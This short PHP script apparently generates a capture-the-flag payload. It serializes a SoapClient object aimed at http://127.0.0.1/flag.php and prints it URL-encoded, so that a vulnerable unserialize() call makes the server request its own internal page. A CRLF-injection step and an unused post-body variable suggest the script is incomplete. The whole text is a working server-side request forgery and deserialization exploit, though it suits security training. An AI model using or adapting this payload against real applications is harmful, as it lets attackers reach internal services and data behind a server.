<?php
$target = "http://127.0.0.1/flag.php";
$post_string = 'v=v';
$b = new SoapClient(null, array('uri' => $target, 'location' => $target));
$aaa = serialize($b);
$aaa = str_replace('^^', "\r\n", $aaa);
echo "|" . urlencode($aaa);

//